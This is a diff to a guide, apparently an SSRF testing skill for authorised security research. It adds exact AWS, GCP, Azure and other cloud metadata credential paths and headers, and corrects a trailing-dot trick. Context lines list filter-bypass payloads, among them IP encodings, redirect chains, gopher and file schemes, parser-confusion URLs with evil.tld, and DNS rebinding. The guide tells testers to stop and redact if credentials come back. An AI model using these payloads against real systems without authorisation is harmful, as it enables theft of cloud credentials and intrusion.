@@ -66,12 +66,17 @@ Cloud metadata endpoints - the highest-value SSRF target:
 
 | Cloud | Endpoint | Note |
 |---|---|---|
-| AWS IMDSv1 | `http://169.254.169.254/latest/meta-data/iam/security-credentials/` | returns temporary credentials |
-| AWS IMDSv2 | needs `X-aws-ec2-metadata-token` via a `PUT` first | header control required; usually not reachable via basic SSRF |
+| AWS IMDSv1 | `http://169.254.169.254/latest/meta-data/iam/security-credentials/` | lists the attached **role name** only - a lead, not the proof |
+| AWS IMDSv1 creds | `http://169.254.169.254/latest/meta-data/iam/security-credentials/<role>` | the `AccessKeyId`/`SecretAccessKey`/`Token` JSON. **This** is the Critical proof |
+| AWS IMDSv2 | `PUT /latest/api/token` + `X-aws-ec2-metadata-token-ttl-seconds: 21600` -> token, then `GET /latest/meta-data/...` + `X-aws-ec2-metadata-token: <token>` | method *and* request-header control required; usually not reachable via basic SSRF |
 | GCP | `http://169.254.169.254/computeMetadata/v1/` + `Metadata-Flavor: Google` | header required |
 | Azure | `http://169.254.169.254/metadata/instance?api-version=2021-02-01` + `Metadata: true` | header required |
 | Alibaba | `http://100.100.100.100/latest/meta-data/` | no header |
 | Kubernetes | `https://kubernetes.default.svc/api/v1/namespaces` | plus the service-account token |
+
+Do not report "temporary credentials were returned" off the bare `security-credentials/`
+listing - that response is one line of role name, and a triager who opens your evidence and sees
+it will downgrade or close the report. Append the role name and fetch the credentials path.
 
 **If you retrieve cloud credentials, stop immediately.** Do not call the cloud API with them.
 Redact them in your evidence, report that they were retrievable, and say you did not use them.
@@ -85,13 +90,21 @@ alternate encodings   127.0.0.1 -> 2130706433 · 0x7f000001 · 0177.0.0.1 · 127
 DNS that resolves in  127.0.0.1.nip.io · localtest.me · a record on YOUR OWN domain -> 127.0.0.1
 redirect chain        your host 302s to http://169.254.169.254/  (bypasses allow-list-on-input)
 credentials trick     http://expected-host@169.254.169.254/  ·  http://169.254.169.254#expected-host
-case + dots           http://127.0.0.1./  ·  HTTP://LOCALHOST/
+case + trailing dot   HTTP://LOCALHOST/  ·  http://localhost./  ·  http://metadata.google.internal./
 double URL encoding   %2568ttp / %252f
 schema swap           file:// gopher:// dict:// ftp:// ldap:// jar:// netdoc:// http+unix://
 parser confusion      http://expected.com:@evil.tld/  ·  http://evil.tld\@expected.com/
 IPv6 forms            [::] · [0:0:0:0:0:ffff:127.0.0.1]
 DNS rebinding         a name you control that alternates between a public IP and 127.0.0.1
 ```
+
+**The trailing dot goes on a name, never on a literal.** It is a DNS root-label trick: `localhost.`
+resolves, `169.254.169.254.nip.io` resolves, but `127.0.0.1.` is not a legal IPv4 literal -
+measured here, `inet_aton('127.0.0.1.')` raises and `getaddrinfo('127.0.0.1.', 80)` returns
+`Name or service not known`, so every getaddrinfo-based fetcher (Python, Go, Java, libcurl) never
+leaves the box. Only WHATWG-URL parsers (browsers, `whatwg-url`, some Node fetchers) strip the
+empty final label. Probe a literal-with-dot against a getaddrinfo fetcher and you get a DNS
+error that reads exactly like "the filter held" - the misread this skill warns about below.
 
 **DNS rebinding** is the answer to "it validated the IP, then fetched it" - the check and the
 fetch resolve separately, and your record flips in between.
